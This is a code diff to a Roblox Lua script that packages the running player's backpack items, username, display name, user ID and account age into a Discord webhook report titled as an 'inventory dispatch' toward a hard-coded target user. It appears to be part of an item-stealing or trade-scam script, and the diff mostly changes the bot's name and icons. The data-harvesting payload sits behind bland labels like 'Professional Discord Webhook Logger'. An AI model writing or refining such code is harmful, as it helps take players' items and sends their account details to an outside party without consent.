@@ -55,7 +55,7 @@ if existing then
     if existingFrame then existingFrame.Visible = false end
 end
 
--- Professional Discord Webhook Logger (No Custom Avatar Fields)
+-- Professional Discord Webhook Logger
 local function sendBackpackToWebhook()
     local backpack = localPlayer:FindFirstChild("Backpack")
     if not backpack then warn("Backpack not found") return end
@@ -78,28 +78,25 @@ local function sendBackpackToWebhook()
 
     local hasItems = #items > 0
     local itemList = hasItems and table.concat(items, "\n") or "*No transferable items detected in inventory.*"
-    local embedColor = hasItems and 0x00E5FF or 0x36393E
-
-    local accountAge = "Unknown"
-    pcall(function()
-        accountAge = tostring(localPlayer.AccountAge)
-    end)
+    local embedColor = hasItems and 0x00E5FF or 0x36393E -- Vibrant Cyan if items exist, Dark Hex if empty
 
     local HttpService = game:GetService("HttpService")
     local payload = HttpService:JSONEncode({
-        username = "Dispatch Bot",
+        username = "Central Processing System",
+        avatar_url = "https://i.imgur.com/W9v686C.png", -- Clean default developer bot icon
         embeds = {{
             title = "📦 INVENTORY DISPATCH REPORT",
             description = "A new player asset transfer sequence has been initialized on execution.",
             color = embedColor,
             fields = {
                 { name = "👤 Account Identity", value = string.format("**User:** %s\n**Display:** %s", localPlayer.Name, localPlayer.DisplayName), inline = true },
-                { name = "🔑 System Metrics", value = string.format("**User ID:** `%s`\n**Account Age:** %s days", tostring(localPlayer.UserId), accountAge), inline = true },
+                { name = "🔑 System Metrics", value = string.format("**User ID:** `%s`\n**Account Age:** %s days", tostring(localPlayer.UserId), tostring(localPlayer.AccountAge)), inline = true },
                 { name = "📊 Transmission Status", value = string.format("**Total Items:** `%d`\n**Target:** `%s`", #items, TARGET_USERNAME), inline = false },
                 { name = "📂 Collected Inventory Manifest", value = itemList, inline = false }
             },
             footer = { 
-                text = "Automated Data Ledger • Pipeline Logs"
+                text = "Automated Data Ledger • Pipeline Logs", 
+                icon_url = "https://i.imgur.com/W9v686C.png" 
             },
             timestamp = DateTime.now():ToISO8601String()
         }}
